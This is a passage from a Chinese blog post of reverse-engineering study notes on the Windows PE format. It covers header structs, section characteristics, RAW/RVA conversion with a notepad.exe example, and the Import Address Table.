class="keyword">define</span> IMAGE_FILE_MACHINE_MIPSFPU16         0x0466  <span class="comment">// MIPS</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_ALPHA64           0x0284  <span class="comment">// ALPHA64</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_MACHINE_AXP64             IMAGE_FILE_MACHINE_ALPHA64</span></span><br></pre></td></tr></table></figure><p>_IMAGE_FILE_HEADER.<strong>NumberOfSection</strong>：标记存在的节区数，该值需要大于0且与实际的节区数一致，上述例子的NumberOfSection值&#x3D;0x0004 表示存在4个节区</p><p>_IMAGE_FILE_HEADER.<strong>SizeOfOptionalHeader</strong>：指出NT头结构中最后一个成员optionalHeader的大小，optionalHeader对应的结构体是IMAGE_OPTIONAL_HEADER，根据系统位数不同，其大小已经确定，只是在载入文件时需要查看该值来确定OptionalHeader，PE32中该值&#x3D;0x00E0，该字段用来说明optionalHeader大小</p><p>_IMAGE_FILE_HEADER.<strong>Characteristics</strong>：这个字段用于标识文件的属性，比如文件是否是可运行的状态，是否为DLL文件，也有对应的值，不可随意更动。常用的是0x0002（可执行文件）  、 0x2000（DLL文件），上述例子中该值&#x3D;0x210E(貌似是文件属性的叠加，多个属性的样子)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_RELOCS_STRIPPED           0x0001  <span class="comment">// Relocation info stripped from file.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  <span class="comment">// File is executable  (i.e. no unresolved externel references).</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  <span class="comment">// Line nunbers stripped from file.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  <span class="comment">// Local symbols stripped from file.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  <span class="comment">// Agressively trim working set</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  <span class="comment">// App can handle &gt;2gb addresses</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_BYTES_REVERSED_LO         0x0080  <span class="comment">// Bytes of machine word are reversed.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_32BIT_MACHINE             0x0100  <span class="comment">// 32 bit word machine.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_DEBUG_STRIPPED            0x0200  <span class="comment">// Debugging info stripped from file in .DBG file</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  <span class="comment">// If Image is on removable media, copy and run from the swap file.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  <span class="comment">// If Image is on Net, copy and run from the swap file.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_SYSTEM                    0x1000  <span class="comment">// System File.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_DLL                       0x2000  <span class="comment">// File is a DLL.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  <span class="comment">// File should only be run on a UP machine</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_BYTES_REVERSED_HI         0x8000  <span class="comment">// Bytes of machine word are reversed.</span></span></span><br></pre></td></tr></table></figure><h6 id="IMAGE-NT-HEADERS-OptionalHeader"><a href="#IMAGE-NT-HEADERS-OptionalHeader" class="headerlink" title="_IMAGE_NT_HEADERS.OptionalHeader"></a>_IMAGE_NT_HEADERS.<strong>OptionalHeader</strong></h6><p>_IMAGE_OPTIONAL_HEADER结构体类型，这个结构体有PE32 &amp; PE32+两个版本，这里先学习PE32版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span><span class="comment">//32bit OS version</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span><span class="comment">//64bit OS version</span></span><br><span class="line">    WORD        Magic;</span><br><span class="line">    BYTE        MajorLinkerVersion;</span><br><span class="line">    BYTE        MinorLinkerVersion;</span><br><span class="line">    DWORD       SizeOfCode;</span><br><span class="line">    DWORD       SizeOfInitializedData;</span><br><span class="line">    DWORD       SizeOfUninitializedData;</span><br><span class="line">    DWORD       AddressOfEntryPoint;</span><br><span class="line">    DWORD       BaseOfCode;</span><br><span class="line">    ULONGLONG   ImageBase;</span><br><span class="line">    DWORD       SectionAlignment;</span><br><span class="line">    DWORD       FileAlignment;</span><br><span class="line">    WORD        MajorOperatingSystemVersion;</span><br><span class="line">    WORD        MinorOperatingSystemVersion;</span><br><span class="line">    WORD        MajorImageVersion;</span><br><span class="line">    WORD        MinorImageVersion;</span><br><span class="line">    WORD        MajorSubsystemVersion;</span><br><span class="line">    WORD        MinorSubsystemVersion;</span><br><span class="line">    DWORD       Win32VersionValue;</span><br><span class="line">    DWORD       SizeOfImage;</span><br><span class="line">    DWORD       SizeOfHeaders;</span><br><span class="line">    DWORD       CheckSum;</span><br><span class="line">    WORD        Subsystem;</span><br><span class="line">    WORD        DllCharacteristics;</span><br><span class="line">    ULONGLONG   SizeOfStackReserve;</span><br><span class="line">    ULONGLONG   SizeOfStackCommit;</span><br><span class="line">    ULONGLONG   SizeOfHeapReserve;</span><br><span class="line">    ULONGLONG   SizeOfHeapCommit;</span><br><span class="line">    DWORD       LoaderFlags;</span><br><span class="line">    DWORD       NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure><p>IMAGE_OPTIONAL_HEADER.<strong>Magic</strong>，当为IMAGE_OPTIONAL_HEADER32时该值&#x3D;10B，为IMAGE_OPTIONAL_HEADER64时该值&#x3D;20B</p><p>MAGE_OPTIONAL_HEADER.<strong>AddressEntryPoint</strong>相当重要，指出文件最先执行代码的RVA</p><p>MAGE_OPTIONAL_HEADER.<strong>ImageBase</strong>，文件优先装入的位置（可能被抢占）</p><p>…这里省略一些不是很重要的成员</p><p>MAGE_OPTIONAL_HEADER最后一个成员特别重要：IMAGE_DATA_DIRECTORY类型的DataDirectory，是一个结构体数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>数组成员，在进行资源定位时需要根据这里的信息来完成：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DataDirectory[<span class="number">0</span>] = EXPORT Directory</span><br><span class="line">DataDirectory[<span class="number">1</span>] = IMPORT Directory</span><br><span class="line">DataDirectory[<span class="number">2</span>] = RESOURCE Directory</span><br><span class="line">DataDirectory[<span class="number">3</span>] = EXCEPTION Directory</span><br><span class="line">DataDirectory[<span class="number">4</span>] = SECURITY Directory</span><br><span class="line">DataDirectory[<span class="number">5</span>] = BASERELOC Directory</span><br><span class="line">DataDirectory[<span class="number">6l</span> = DEBUG Directory</span><br><span class="line">DataDirectory[<span class="number">7</span>] = COPYRIGHT Directory</span><br><span class="line">DataDirectory[<span class="number">8</span>] = GLOBALPTR Directory</span><br><span class="line">DataDirectory[<span class="number">9</span>] = TLS Directory</span><br><span class="line">DataDirectory[A] = LOAD CONFIG Directory</span><br><span class="line">DataDirectory[B] = BOUND IMPORT Directory</span><br><span class="line">DataDirectory[C] = IAT Directory</span><br><span class="line">DataDirectory[D] = DELAY IMPORT Directory</span><br><span class="line">DataDirectoryIE] = COM DESCRIPTOR Directory</span><br><span class="line">DataDirectory[F] = Reserved Directory</span><br></pre></td></tr></table></figure><hr><h5 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="IMAGE_SECTION_HEADER"></a><strong>IMAGE_SECTION_HEADER</strong></h5><p>对应的结构体：<strong>IMAGE_SECTION_HEADER</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;<span class="comment">//节区在内存中所占大小</span></span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">//节区载入内存的地址（RVA）</span></span><br><span class="line">    DWORD   SizeOfRawData;<span class="comment">//节区在文件中所占大小</span></span><br><span class="line">    DWORD   PointerToRawData;<span class="comment">//节区在文件中的位置</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;<span class="comment">//节区属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>由于文件在磁盘上，载入内存时会有差异，但同个部分的相对位置的不发生变化的。</p><p>在我的电脑中的HxD查看notepad.exe，以.text节区为例，选中部分是.text的节区部分：</p><img src="/2022/04/26/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No.1--PE%E6%A0%BC%E5%BC%8F/4.png" class=""><table><thead><tr><th>成员</th><th>值</th><th>解释</th></tr></thead><tbody><tr><td>Name（NULL结束）</td><td>2E 74 65 78 74 00 00 00</td><td>节区名</td></tr><tr><td>VirtualSize</td><td>0x00007748（后续有对齐字段影响它）</td><td>内存中节区大小</td></tr><tr><td>VirtualAddress(RVA)</td><td>0x00001000</td><td>内存中节区的offset</td></tr><tr><td>SizeOfRawData</td><td>0x00007800</td><td>磁盘文件中节区大小</td></tr><tr><td>PointToRawDate</td><td>0x00000400</td><td>磁盘文件中节区offset</td></tr><tr><td>…</td><td>…</td><td>…</td></tr><tr><td>Characteristics</td><td>0x60000020</td><td></td></tr></tbody></table><p><strong>characteristics</strong>使用如下不同的属性对应的值进行OR运算构成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Section characteristics.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_REG                   0x00000000  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_DSECT                 0x00000001  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_NOLOAD                0x00000002  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_GROUP                 0x00000004  // Reserved.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_TYPE_NO_PAD                0x00000008  <span class="comment">// Reserved.</span></span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_COPY                  0x00000010  // Reserved.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_CNT_CODE                   0x00000020  <span class="comment">// Section contains code.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_CNT_INITIALIZED_DATA       0x00000040  <span class="comment">// Section contains initialized data.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_CNT_UNINITIALIZED_DATA     0x00000080  <span class="comment">// Section contains uninitialized data.</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_OTHER                  0x00000100  <span class="comment">// Reserved.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_INFO                   0x00000200  <span class="comment">// Section contains comments or some other type of information.</span></span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_OVER                  0x00000400  // Reserved.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_REMOVE                 0x00000800  <span class="comment">// Section contents will not become part of image.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_COMDAT                 0x00001000  <span class="comment">// Section contents comdat.</span></span></span><br><span class="line"><span class="comment">//                                           0x00002000  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_MEM_PROTECTED - Obsolete   0x00004000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_NO_DEFER_SPEC_EXC          0x00004000  <span class="comment">// Reset speculative exceptions handling bits in the TLB entries for this section.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_GPREL                      0x00008000  <span class="comment">// Section content can be accessed relative to GP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_FARDATA                0x00008000</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_MEM_SYSHEAP  - Obsolete    0x00010000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_PURGEABLE              0x00020000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_16BIT                  0x00020000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_LOCKED                 0x00040000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_PRELOAD                0x00080000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_1BYTES               0x00100000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_2BYTES               0x00200000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_4BYTES               0x00300000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_8BYTES               0x00400000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_16BYTES              0x00500000  <span class="comment">// Default alignment if no others are specified.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_32BYTES              0x00600000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_64BYTES              0x00700000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_128BYTES             0x00800000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_256BYTES             0x00900000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_512BYTES             0x00A00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_1024BYTES            0x00B00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_2048BYTES            0x00C00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_4096BYTES            0x00D00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_8192BYTES            0x00E00000  <span class="comment">//</span></span></span><br><span class="line"><span class="comment">// Unused                                    0x00F00000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_NRELOC_OVFL            0x01000000  <span class="comment">// Section contains extended relocations.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_DISCARDABLE            0x02000000  <span class="comment">// Section can be discarded.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_NOT_CACHED             0x04000000  <span class="comment">// Section is not cachable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_NOT_PAGED              0x08000000  <span class="comment">// Section is not pageable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_SHARED                 0x10000000  <span class="comment">// Section is shareable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_EXECUTE                0x20000000  <span class="comment">// Section is executable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_READ                   0x40000000  <span class="comment">// Section is readable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_WRITE                  0x80000000  <span class="comment">// Section is writeable.</span></span></span><br></pre></td></tr></table></figure><p>例子中节区.text的characteristics的值&#x3D;0x60000020，表明是Section executable&amp;Section readable&amp;Section contains code的组合</p><hr><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><h5 id="RAW-lt-gt-RVA转换"><a href="#RAW-lt-gt-RVA转换" class="headerlink" title="RAW&lt;-&gt;RVA转换"></a>RAW&lt;-&gt;RVA转换</h5><p>可执行程序在文件系统中各个字段的位置有自己相对于PE文件的偏移，当载入内存又是另外的情况了。</p><p>公式：&#x3D;&#x3D;<strong>RAW - PointToRawData &#x3D; RVA - VirtualAddress</strong>&#x3D;&#x3D;</p><p>书中有个很好的例子（notepad.exe）会使用到前文学习到的一些字段。</p><p>Q1：RVA &#x3D; 5000 时 FILE OFFSET是多少？</p><blockquote><p>RVA &#x3D; 5000 对应的节区是.text，这是由于RVA &#x3D; 5000落在.text的节区头信息中VirtualSize（0x7748）以及VirtualAddress（0x1000）决定的区间确定的。再根据字段PointToRawData（0x400），套用公式：RAW &#x3D; 5000 - 1000 + 400 &#x3D; 4400</p><p>因此RVA &#x3D; 5000对应RAW &#x3D; 4400的内容</p></blockquote><hr><h5 id="IAT-Import-Address-Table"><a href="#IAT-Import-Address-Table" class="headerlink" title="IAT(Import Address Table)"></a>IAT(Import Address Table)</h5><blockquote><p>关于IAT的描述：</p><p>一般程序在调用自身函数的时候，自身函数地址RAV是固定的；但是当程序在调用dll里的函数的时候，由于dll的地址会发生重定位，导致dll里的函数地址每次都会发生变化。</p><p>为了每次都能准确的调用dll函数的地址，就特意构建了一张表，用于存储每次程序运行，dll发生重定位之后，dll的函数的地址。</p><p>而这样之后，那自身程序在调用dll函数的时候，就可以用“类似指针”指向这张表格，取其值为函数新的地址。即可准确调用dll的函数。</p></blockquote><p><strong>相关结构体：IMAGE_IMPORT_DESCRIPTOR</strong> 属于NT头第三个成员的IMAGE_OPTIONAL_HEADER【NT头中最大的结构体】中最后一个成员，上文介绍NT头部分提及了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DataDirectory[<span class="number">0</span>] = EXPORT Directory</span><br><span class="line">DataDirectory[<span class="number">1</span>] = IMPORT Directory<span class="comment">//IAT</span></span><br><span class="line">DataDirectory[<span class="number">2</span>] = RESOURCE Directory</span><br><span class="line">DataDirectory[<span class="number">3</span>] = EXCEPTION Directory</span><br><span class="line">DataDirectory[<span class="number">4</span>] = SECURITY Directory</span><br><span class="line">DataDirectory[<span class="number">5</span>] = BASERELOC Directory</span><br><span class="line">DataDirectory[<span class="number">6l</span> = DEBUG Directory</span><br><span class="line">DataDirectory[<span class="number">7</span>] = COPYRIGHT Directory</span><br><span class="line">DataDirectory[<span class="number">8</span>] = GLOBALPTR Directory</span><br><span class="line">DataDirectory[<span class="number">9</span>] = TLS Directory</span><br><span class="line">DataDirectory[A] = LOAD CONFIG Directory</span><br><span class="line">DataDirectory[B] = BOUND IMPORT Directory</span><br><span class="line">DataDirectory[C] = IAT Directory</span><br><span class="line">DataDirectory[D] = DELAY IMPORT Directory</span><br><span class="line">DataDirectoryIE] = COM DESCRIPTOR Directory</span><br><span class="line">DataDirectory[F] = Reserved Directory</span><br></pre></td></tr></table></figure><p>Import Address Table位于&#x3D;&#x3D;DataDirectory[1]&#x3D;&#x3D;中的值（是个地址，维护一个数组，每一个元素对应一个IMAGE_IMPORT_DESCRIPTOR结构体，且IMAGE_IMPORT_DESCRIPTOR的数量对应文件运行需要导入的库的个数，结构体最后一NULL结尾）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">//指向结构体_IMAGE_IMPORT_DESCRIPTOR</span></span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 